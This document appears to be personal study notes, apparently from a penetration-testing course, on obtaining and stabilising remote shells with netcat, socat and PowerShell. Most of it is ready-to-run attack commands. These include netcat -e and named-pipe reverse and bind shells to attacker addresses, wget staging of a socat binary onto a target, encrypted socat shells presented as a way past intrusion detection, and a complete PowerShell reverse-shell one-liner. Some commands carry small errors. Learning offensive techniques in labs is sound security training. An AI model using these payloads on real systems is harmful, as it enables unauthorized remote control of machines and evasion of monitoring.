# Shells

bash or sh on Linux, cmd.exe or Powershell on WindowsReverse
Shell - attack runs exploit so remote server sends attacker command line access. Good for bypassing target firewall rules.
Bind shell - attacker runs exploit opening a port hosting command line on the server and then connects it. No config on home network required.

# Malicious shellcode

- netcat - set up network interaction and listeners to receive shellssocat - netcat on steroids, typically more stable, but harder syntax and not default
- Metasploit auxiliary/multi/handler - stable shells and meterpreter shell, also makes it easy to handle stages payloads
- msfvenom - multi-capable payload generating tool, including reverse and bind shells
- *reference SecLists repo for good wordlists / creds*

### Reverse Shell (linux ex):

Local > `sudo nc -lvnp 443`, to set up a listener for HTTPS
Target > `nc MY_IP PORT -e /bin/bash`, to connect to listener serving bash

### Bind Shell (windows ex):

Target > `nc -lvnp PORT -e "cmd.exe"`
Local > `nc TARGET_IP PORT`

# Interactive vs Non-interactive Shell

- Interactive allows a use to be prompted by and respond to executed programs
- Non-interactive is incapable of providing this functionality. As a result, commands like ssh that prompt for login don't work without a shell being upgraded to interactive.

# Netcat Shell Stabilization

*typically harder in Windows than in Linux*

### Technique 1: Python (Linux)
- `python -c 'import pty;pty.spawn("/bin/bash")`  *spawns a featured bash shell, may need to specify python version*
- `export TERM=xterm`, sets terminal emulator to xterm for more features
- CTRL-Z, to background shell
- `stty raw -echo; fg`, turn off base terminal echo (gives tab autocomplete, arrow keys, CTRL-C) then foreground shell
    *if shell dies, base terminal is invisible, use `reset` to get it back*

### Technique 2: rlwrap (Windows & Linux)
- `sudo apt install rlwrap`, premade program that gives most shell features
- `rlwrap nc -lvnp PORT`, run program on nc
- (Linux) CTRL-Z, then `stty raw -echo; fg`, turn off base terminal for complete stabilization

### Technique 3: Socat (Linux)
- Host python server in socat **binary** directory, for upload to target
- `wget SERVER/socat -O /tmp/socat` on target to get the binary file (no dependencies) for execution

### Extra (text editor usability)
- `stty -a` in another terminal to get terminal display info
- `stty rows XX` and `stty cols XX` on target using previous values

# socat

*point to point connector ie. keyboard to port, file to port, port to port*

### Reverse Shells
- `socat TCP-L:PORT -`, basic listener
- `socat TCP:MY_IP:PORT EXEC:powershell.exe,pipes`, listener on Windows (pipes for unix style I/O)
*run the previous commands on the target for a bind, and `socat TCP:TARGET_IP:PORT -` on local machine ofr a bind shell*

### Interactive Shell (tty)
1.  ``socat TCP-L:PORT FILE:`tty`,raw,echo=0`` , sets up connection to port with a featured shell, but it must have socat installed
2. upload socat binary to target ( `python3 -m http.server` in socat dir -> `wget` on target)
3. `socat TCP:MY_IP:PORT EXEC:"bash -li",pty,stderr,sigint,setsid,sane` , hosts interactive shell on target
>bash -li, -l is "login shell" meaning, ini files are read from /home/*user*, and -i means interactive
> pty (pseudo-teletype), allocates a pseudoterminal on the target via a "pipe" -- part of the stabilization process
> stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
> sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
> setsid, creates the process in a new session
> sane, stabilises the terminal, attempting to "normalise" it.


# socat Encrypted Shells

socat can perform shell encryption which often passes IDS by default. *Replace `TCP` with `OPENSSL` to create **encrypted** socat shells*

### Certificate Generation
- `openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt`, to generate a 2048 bit RSA cert, self-signed, valid for a year
- `cat shell.key shell.crt > shell.pem`, merges the key and cert in a pem file, cert **must** be used on **listening machine**
  
### Reverse Shell
- `socat OPENSSL-LISTEN:PORT,cert=shell.pem,verify=0 -` , attacker sets up openSSL listener with self-signed cert, but tells it not to verify it
- `socat OPENSSL:ATTACK-IP:PORT,verify=0 EXEC bin/bash` , target offers shell control, no verification
  
### Bind Shell
- `socat OPENSSL-LISTEN:PORT,cert=shell.pem,verify=0,EXEC:cmd.exe,pipes` , target machine listens
- `socat OPENSSL:TARGET-IP:PORT,verify=0 -` , attacker interacts with hosted shell

# Common Shell Payloads
*Lo-spec reverse shells for Windows and Linux*

- netcat for windows, `nc.exe`, located at: `/usr/share/windows-resources/binaries` in kali
- `-e` , allows for process execution on connnection, ie. `/bin/bash` 
-  ex. `nc -lvnp 8000 -e /bin/bash` hosts terminal to a connector (bind)
-  ex. `nc 10.10.10.69 8000 -e /bin/bash` offers terminal to listener (reverse)

### -e Exclusion Workaround (Linux)
`mkfifo /tmp/f; nc -lvnp 8000 < /tmp/f | /bin/sh > tmp/f 2>&1; rm /tmp/f`   (BIND)
 - mkfifo, creates a named pipe at location
 - nc listener, takes input from (currently empty) pipe
 - nc listener outputs to a spawned sh session (the terminal commands from the attacker)
 - sh session outputs stdout and stderror to pipe (which feeds nc, giving feedback to the attacker)
`mkfifo /tmp/f; nc 10.10.10.69 8000 < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f` (REVERSE)

### -e Exclusion (Windows)
`powershell -c $client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
- 